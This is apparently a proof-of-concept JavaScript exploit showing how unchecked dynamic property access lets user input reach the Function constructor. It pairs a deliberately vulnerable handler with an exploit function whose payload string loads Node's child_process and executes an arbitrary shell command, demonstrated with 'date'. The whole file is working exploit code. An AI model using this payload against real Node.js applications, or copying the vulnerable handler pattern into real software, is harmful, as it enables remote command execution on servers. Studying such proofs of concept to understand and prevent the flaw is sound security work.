var user = function() { 
  this.name = 'jon';
  //An empty user constructor.
};

function handler(userInput) {
  var anyVal = 'anyVal'; // This can be any attribute, and does not need to be user controlled.
  user[anyVal] = user[userInput[0]](userInput[1]);
}

function exploit(cmd){
  var userInputStageOne = [
    'constructor',
    'global.process.mainModule.require("child_process").exec(arguments[0],console.log)'
  ];
  var userInputStageTwo = [
    'anyVal',
    cmd
  ];

  handler(userInputStageOne); 
  handler(userInputStageTwo);
}

exploit('date') // If current date is printed, then successfully exploited